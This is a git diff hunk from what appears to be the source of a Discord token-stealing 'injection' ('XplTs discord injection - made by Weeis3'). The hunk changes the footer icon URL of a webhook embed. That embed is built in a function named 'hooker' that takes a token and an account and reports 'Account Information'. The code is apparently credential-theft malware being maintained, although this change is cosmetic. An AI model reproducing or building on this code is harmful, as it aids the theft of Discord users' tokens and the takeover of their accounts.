@@ -157,7 +157,7 @@ const hooker = async (content, token, account) => {
     };
     content["embeds"][0]["footer"] = {
         "text": "XplTs discord injection - made by Weeis3",
-        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+        "icon_url": "https://cdn.discordapp.com/attachments/1237348402791055390/1316491351310864466/xplts.webp?ex=675b3d9d&is=6759ec1d&hm=b0dc4d06cd41092bb892377617177af5bffc1788bc9a91bc2ffab96adf9d725d&",
     };
     content["embeds"][0]["title"] = "Account Information";
 
